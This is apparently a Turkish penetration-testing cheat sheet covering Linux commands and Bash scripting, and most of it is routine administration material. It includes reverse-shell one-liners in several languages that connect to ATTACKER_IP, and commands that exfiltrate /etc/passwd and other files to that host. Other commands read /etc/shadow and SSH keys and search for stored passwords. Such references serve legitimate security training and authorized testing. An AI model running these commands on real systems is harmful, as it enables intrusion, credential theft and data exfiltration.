[🇬🇧 English](../../README.md)

# 🐧 Linux Komutları & Bash - Kapsamlı Sızma Testi Başvuru Kılavuzu

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## 📋 İçindekiler

- [Dizinlerde Gezinme & Dosyalar](#-dizinlerde-gezinme--dosyalar)
- [Sistem Bilgisi Toplama (Enumeration)](#-sistem-bilgisi-toplama-enumeration)
- [Kullanıcı Numaralandırma](#-kullanıcı-numaralandırma)
- [Ağ Komutları](#-ağ-komutları)
- [Dosya Arama & Analiz](#-dosya-arama--analiz)
- [Metin İşleme](#-metin-i̇şleme)
- [İzinler & Dosya Sahipliği](#-i̇zinler--dosya-sahipliği)
- [Süreç (Process) Yönetimi](#-süreç-process-yönetimi)
- [Paket Yönetimi](#-paket-yönetimi)
- [Bash Betik Programlama](#-bash-betik-programlama)
- [Ters Bağlantı Kabukları (Reverse Shells)](#-ters-bağlantı-kabukları-reverse-shells)
- [Dosya Transferleri](#-dosya-transferleri)
- [Tek Satırlık Komutlar (One-Liners)](#-tek-satırlık-komutlar-one-liners)

---

## 📁 Dizinlerde Gezinme & Dosyalar

### Dizin Gezinimi

```bash
# Geçerli dizini görüntüleme
pwd

# Dizin değiştirme
cd /path/to/dir
cd ..          # Üst dizine çık
cd ~           # Ev (home) dizinine git
cd -           # Bir önceki dizine dön

# Dosyaları listeleme
ls
ls -la         # Uzun liste biçimi, gizli dosyalar dahil
ls -lah        # Okunabilir dosya boyutları (KB, MB, GB)
ls -latr       # Değiştirilme zamanına göre tersten sırala
ll             # ls -la için yaygın kısayol/alias
```

### Dosya İşlemleri

```bash
# Dosya/dizin oluşturma
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Üst dizinleri de otomatik oluştur

# Kopyalama
cp source dest
cp -r source_dir dest_dir  # Özyinelemeli (klasörler için)

# Taşıma/Yeniden Adlandırma
mv source dest
mv oldname newname

# Silme
rm file
rm -r directory            # Dizinleri özyinelemeli sil
rm -rf directory           # Onay istemeden zorla sil

# Dosya görüntüleme
cat file.txt
less file.txt              # Sayfalama aracı
more file.txt
head -n 20 file.txt        # İlk 20 satırı göster
tail -n 20 file.txt        # Son 20 satırı göster
tail -f file.txt           # Canlı olarak takip et (loglar için)
```

### Arşivleme & Sıkıştırma

```bash
# tar
tar -cvf archive.tar files/      # Arşiv oluştur
tar -xvf archive.tar             # Arşivi çıkart
tar -czvf archive.tar.gz files/  # gzip ile sıkıştırılmış arşiv oluştur
tar -xzvf archive.tar.gz         # gzip arşivini çıkart

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 Sistem Bilgisi Toplama (Enumeration)

### Sistem Bilgileri

```bash
# Host adı
hostname
hostname -I               # IP adresleri

# İşletim Sistemi / Çekirdek
uname -a                  # Tüm sistem bilgileri
uname -r                  # Çekirdek sürümü
cat /etc/os-release       # Dağıtım ve OS bilgisi
cat /etc/issue            # Giriş ekranı banner bilgisi
cat /proc/version         # Çekirdek/derleyici detayları

# Mimari
arch
uname -m

# Donanım
lscpu                     # İşlemci detayları
cat /proc/cpuinfo
free -h                   # Bellek (RAM) kullanımı
df -h                     # Disk alanı kullanımı
lsblk                     # Blok cihazları ve bölümleri
```

### Ortam Değişkenleri (Environment)

```bash
# Ortam değişkenlerini listeleme
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Değişken atama
export VAR="value"
VAR="value"
```

### Çalışan Servisler

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Dinlenen portları kontrol etme
ss -tulpn
netstat -tulpn
```

### Zamanlanmış Görevler (Cron Jobs)

```bash
# Kullanıcı crontab listesi
crontab -l

# Sistem crontab dosyaları
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Arka plan cron işlemlerini canlı izleme (pspy ile)
./pspy64
```

### Yüklü Paketler

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Paket veya ikili dosya bulma
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 Kullanıcı Numaralandırma

### Geçerli Kullanıcı

```bash
# Kimim ben?
whoami
id
id username

# Gruplar
groups
groups username

# Yetkiler / Sudo İzinleri
sudo -l                   # Sudo izinlerini listele
cat /etc/sudoers          # Sudoers dosyası (root gerektirir)
```

### Tüm Kullanıcılar

```bash
# Kullanıcı listesi
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Geçerli kabuğu olan kullanıcılar (giriş yapabilenler)
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Parola hash'leri (root gerektirir)
cat /etc/shadow

# Son oturum açan kullanıcılar
last
lastlog
w
who
users
```

### İlgi Çekici Dosyalar

```bash
# SSH anahtarları
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Komut geçmişi
cat ~/.bash_history
cat ~/.zsh_history
history

# Yapılandırma dosyaları
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Ağ Komutları

### Ağ Yapılandırması

```bash
# IP adresleri
ip a
ip addr show
ifconfig

# Yönlendirme (Routing) tablosu
ip route
route -n
netstat -rn

# DNS sunucuları ve hostlar
cat /etc/resolv.conf
cat /etc/hosts

# ARP tablosu
arp -a
ip neigh
```

### Açık Portlar & Bağlantılar

```bash
# Dinlenen portlar
ss -tulpn
ss -tlnp                  # Yalnızca TCP
netstat -tulpn
netstat -ano

# Aktif bağlantılar
ss -tup
netstat -an | grep ESTABLISHED

# Porta göre süreci bulma
lsof -i :80
fuser 80/tcp
```

### Ağ Testleri

```bash
# Ping
ping -c 4 host

# Rota takibi
traceroute host
tracepath host

# DNS sorguları
host domain.com
dig domain.com
nslookup domain.com

# Port kontrolü
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Yalnızca başlıklar (headers)
curl -s http://host       # Sessiz mod (çıktıyı gizle)
curl -k https://host      # SSL sertifika hatalarını yok say
wget http://host/file
```

### Güvenlik Duvarı (Firewall)

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 Dosya Arama & Analiz

### Find Komutu

```bash
# İsme göre arama
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Büyük/küçük harf duyarsız

# Türe göre arama
find / -type f -name "*.conf"          # Normal dosyalar
find / -type d -name "backup"          # Dizinler

# İzinlere göre arama
find / -perm -4000 2>/dev/null         # SUID bitine sahip dosyalar
find / -perm -2000 2>/dev/null         # SGID bitine sahip dosyalar
find / -perm -o+w 2>/dev/null          # Herkesin yazabildiği dosyalar

# Dosya sahibine göre arama
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Boyuta göre arama
find / -size +100M 2>/dev/null         # 100MB'dan büyük dosyalar
find / -size -1k 2>/dev/null           # 1KB'dan küçük dosyalar

# Değiştirilme zamanına göre arama
find / -mtime -7 2>/dev/null           # Son 7 günde değiştirilenler
find / -atime +30 2>/dev/null          # En son 30 günden önce erişilenler

# Bulup komut çalıştırma (-exec)
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep (Dosyalar İçinde Arama)

```bash
# Temel arama
grep "pattern" file
grep -i "pattern" file                 # Büyük/küçük harf duyarsız
grep -r "pattern" /path/               # Dizin içinde özyinelemeli arama
grep -rn "pattern" /path/              # Satır numaralarıyla birlikte göster

# Eşleşmeyen satırları gösterme
grep -v "pattern" file                 # Eşleşmeyen satırlar

# Eşleşme sayısını bulma
grep -c "pattern" file

# Bağlam satırlarını gösterme
grep -A 3 "pattern" file               # Eşleşen satırdan sonraki 3 satır
grep -B 3 "pattern" file               # Eşleşen satırdan önceki 3 satır
grep -C 3 "pattern" file               # Öncesi ve sonrasındaki 3 satır

# Düzenli İfadeler (Regex)
grep -E "regex" file                   # Gelişmiş regex
egrep "regex" file

# Birden çok desen arama
grep -E "pattern1|pattern2" file
```

### Locate & Which

```bash
# Locate (veritabanı gerektirir)
locate filename
updatedb                               # Veritabanını güncelle

# Which & Whereis (çalıştırılabilir dosya yolu bulma)
which binary
whereis binary
type command
```

### Dosya Analizi

```bash
# Dosya türü tespiti
file filename

# İkili (binary) dosyadaki okunabilir dizgileri çıkarma
strings binary
strings binary | grep password

# Onaltılık (Hex) döküm alma
xxd file
hexdump -C file

# Hash hesaplama
md5sum file
sha256sum file
sha1sum file
```

---

## ✂️ Metin İşleme

### Cut

```bash
# Ayırıcıya (delimiter) göre kesme
cut -d: -f1 /etc/passwd                # İlk sütun (: ayracı)
cut -d: -f1,3 /etc/passwd              # 1. ve 3. sütunlar

# Karakter konumuna göre kesme
cut -c1-10 file                        # İlk 10 karakter
```

### Awk

```bash
# Sütunları yazdırma
awk '{print $1}' file                  # Birinci sütun
awk '{print $1, $3}' file              # 1. ve 3. sütunlar
awk -F: '{print $1}' /etc/passwd       # Özel ayırıcı ile (: ayracı)

# Koşullu filtreleme
awk '$3 > 1000' /etc/passwd            # 3. sütunun 1000'den büyük olduğu satırlar
awk '/pattern/ {print $1}' file        # Desene uyan satırların ilk sütunu

# Dahili değişkenler
awk '{print NR, $0}' file              # Satır numaralarıyla yazdır
awk 'END {print NR}' file              # Toplam satır sayısı
```

### Sed

```bash
# Değiştirme (Substitute)
sed 's/old/new/' file                  # Her satırdaki ilk eşleşmeyi değiştir
sed 's/old/new/g' file                 # Tüm eşleşmeleri değiştir
sed -i 's/old/new/g' file              # Dosya üzerinde kalıcı düzenleme yap

# Satır silme
sed '/pattern/d' file                  # Desene uyan satırları sil
sed '5d' file                          # 5. satırı sil
sed '1,5d' file                        # 1 ile 5 arasındaki satırları sil

# Belirli satırları yazdırma
sed -n '5p' file                       # Yalnızca 5. satırı yazdır
sed -n '1,10p' file                    # 1-10 arasındaki satırları yazdır
```

### Sort & Uniq

```bash
# Sıralama
sort file
sort -r file                           # Tersten sırala
sort -n file                           # Sayısal değerlere göre sırala
sort -u file                           # Benzersiz satırları sırala
sort -t: -k3 -n /etc/passwd            # 3. sütuna göre sayısal sırala

# Benzersiz satırlar
uniq file                              # Yalnızca ardışık tekrarları kaldır
sort file | uniq                       # Tüm mükerrer satırları kaldır
uniq -c file                           # Tekrar sayılarını göster
sort file | uniq -c | sort -rn         # Say ve çoktan aza sırala
```

### Diğer Kullanışlı Araçlar

```bash
# Kelime ve satır sayımı
wc -l file                             # Satır sayısı
wc -w file                             # Kelime sayısı
wc -c file                             # Bayt sayısı

# Sütun biçimlendirme
column -t file                         # Tablo şeklinde hizala
column -s: -t /etc/passwd              # Belirtilen ayırıcıya göre hizala

# tr (karakter dönüştürme)
echo "HELLO" | tr 'A-Z' 'a-z'          # Küçük harfe çevir
cat file | tr -d '\n'                  # Satır sonlarını kaldır

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 İzinler & Dosya Sahipliği

### İzinleri Anlama

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Diğerleri (Others: r-x = 5)
│ │  └───── Grup      (Group:  r-x = 5)
│ └──────── Sahibi    (Owner:  rwx = 7)
└────────── Dosya türü (- = dosya, d = dizin)
```

### Chmod

```bash
# Sayısal mod
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Sembolik mod
chmod +x file                          # Çalıştırma izni ekle
chmod -w file                          # Yazma iznini kaldır
chmod u+x file                         # Sahibe çalıştırma izni ver
chmod g+w file                         # Gruba yazma izni ver
chmod o-r file                         # Diğerlerinin okuma iznini kaldır

# Özyinelemeli (Recursive)
chmod -R 755 directory/
```

### Chown

```bash
# Sahipliği değiştirme
chown user file
chown user:group file
chown -R user:group directory/

# Yalnızca grubu değiştirme
chgrp group file
```

### Özel İzinler

```bash
# SUID (Set User ID) - 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) - 2
chmod g+s directory
chmod 2755 directory

# Sticky Bit - 1
chmod +t directory
chmod 1755 directory

# SUID/SGID dosyalarını bulma
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

## ⚙️ Süreç (Process) Yönetimi

### Süreçleri Görüntüleme

```bash
# Süreçleri listeleme
ps aux
ps -ef
ps aux | grep process_name

# Canlı süreç izleme
top
htop                                   # Gelişmiş görsel izleme aracı

# Süreç ağacı
pstree
ps auxf
```

### Süreç Kontrolü

```bash
# Arka Plan / Ön Plan
command &                              # Arka planda çalıştır
Ctrl+Z                                 # Süreci askıya al
bg                                     # Askıdaki süreci arka planda devam ettir
fg                                     # Arka plandaki süreci ön plana al
jobs                                   # Arka plan işlerini listele

# Süreç sonlandırma (Kill)
kill PID
kill -9 PID                            # Zorla sonlandır (SIGKILL)
killall process_name
pkill process_name

# Nice (İşlem önceliği ayarlama)
nice -n 10 command                     # Düşük öncelikle başlat
renice 10 -p PID
```

---

## 📦 Paket Yönetimi

### Debian/Ubuntu (apt/dpkg)

```bash
# Güncelleme
apt update
apt upgrade

# Kurulum
apt install package
dpkg -i package.deb

# Kaldırma
apt remove package
apt purge package                      # Yapılandırma dosyalarıyla birlikte kaldır

# Arama
apt search package
apt-cache search package

# Bilgi alma
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Güncelleme
yum update
dnf update

# Kurulum
yum install package
dnf install package

# Kaldırma
yum remove package

# Arama
yum search package

# Bilgi alma
yum info package
rpm -qa | grep package
```

---

## 💻 Bash Betik Programlama

### Temel Bilgiler

```bash
#!/bin/bash

# Değişkenler
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Komut ikamesi (Command substitution)
DATE=$(date)
FILES=`ls -la`

# Kullanıcıdan girdi alma
read -p "Adınızı girin: " NAME
echo "Merhaba $NAME"
```

### Koşul İfadeleri

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Dize karşılaştırmaları
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Boş mu?
if [ -n "$str" ]; then                 # Dolu mu?

# Sayısal karşılaştırmalar
if [ $num1 -eq $num2 ]; then           # Eşit
if [ $num1 -ne $num2 ]; then           # Eşit değil
if [ $num1 -gt $num2 ]; then           # Büyüktür
if [ $num1 -lt $num2 ]; then           # Küçüktür

# Dosya testleri
if [ -e file ]; then                   # Dosya mevcut mu?
if [ -f file ]; then                   # Normal bir dosya mı?
if [ -d dir ]; then                    # Bir dizin mi?
if [ -r file ]; then                   # Okunabilir mi?
if [ -w file ]; then                   # Yazılabilir mi?
if [ -x file ]; then                   # Çalıştırılabilir mi?
```

### Döngüler

```bash
# for döngüsü
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# while döngüsü
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# C tarzı for döngüsü
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Fonksiyonlar

```bash
# Fonksiyon tanımlama
function_name() {
    echo "Parametre 1: $1"
    echo "Parametre 2: $2"
    echo "Tüm parametreler: $@"
    echo "Parametre sayısı: $#"
}

# Fonksiyon çağırma
function_name arg1 arg2
```

### Örnek Betik

```bash
#!/bin/bash
# Basit Port Tarayıcı

if [ $# -ne 1 ]; then
    echo "Kullanım: $0 <hedef>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT açık"
done
```

---

## 🔌 Ters Bağlantı Kabukları (Reverse Shells)

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# -e parametresi desteklenen nc ile
nc -e /bin/bash ATTACKER_IP PORT

# -e desteği olmayan standart nc ile
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Kabuk İyileştirme (Upgrade Shell)

```bash
# TTY Kabuk Oluşturma
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Tam Etkileşimli TTY Kabuğu
# Ters bağlantı kabuğu içindeyken:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# Saldırgan makinesinde:
stty raw -echo; fg
# Kabuğa geri dönüldüğünde:
export TERM=xterm
stty rows 40 cols 150
```

---

## ⬇️ Dosya Transferleri

### Saldırgandan Hedefe Transfer

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Saldırgan makinede: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (küçük dosyalar için)
# Saldırganda: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Hedeften Saldırgana Transfer

```bash
# nc
# Saldırgan makinede: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST ile yükleme)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Çıktıyı kopyalayıp saldırgan makinesinde decode edin
```

### HTTP Sunucusu Başlatma

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ Tek Satırlık Komutlar (One-Liners)

### Kullanışlı Sızma Testi Komutları

```bash
# SUID izinli ikili dosyaları bulma
find / -perm -4000 -type f 2>/dev/null

# Yazılabilir dizinleri bulma
find / -writable -type d 2>/dev/null

# Herkes tarafından yazılabilir dosyaları bulma
find / -perm -o+w -type f 2>/dev/null

# Şifre içeren yapılandırma dosyalarını arama
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# SSH anahtarlarını bulma
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Hızlı port taraması
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Ping sweep (Ağ taraması)
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Dosyadan IP adreslerini çıkarma
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Base64 kodlama / çözme
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# URL kodlama / çözme
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Hızlı Başvuru Tablosu

| Amaç | Komut |
|------|-------|
| Geçerli kullanıcı | `whoami` / `id` |
| Sistem bilgisi | `uname -a` |
| IP adresi | `ip a` / `hostname -I` |
| Açık portlar | `ss -tulpn` |
| Çalışan süreçler | `ps aux` |
| SUID dosyaları bulma | `find / -perm -4000 2>/dev/null` |
| Yazılabilir dizinler | `find / -writable -type d 2>/dev/null` |
| Dosya indirme | `wget http://url/file` |
| Ters bağlantı kabuğu | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| TTY kabuğu yükseltme | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Kaynaklar

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### İlgili Başvuru Kılavuzları
- [Linux PrivEsc (Yetki Yükseltme)](../../Linux-PrivEsc/translations/README.tr.md)
- [Nmap](../../Nmap/translations/README.tr.md)
- [Metasploit](../../Metasploit/translations/README.tr.md)

---

<p align="center">
  <b>🐧 Sızma Testleri İçin Linux'ta Uzmanlaşın!</b><br>
  <i>Komut satırı en güçlü yardımcınızdır</i>
</p>
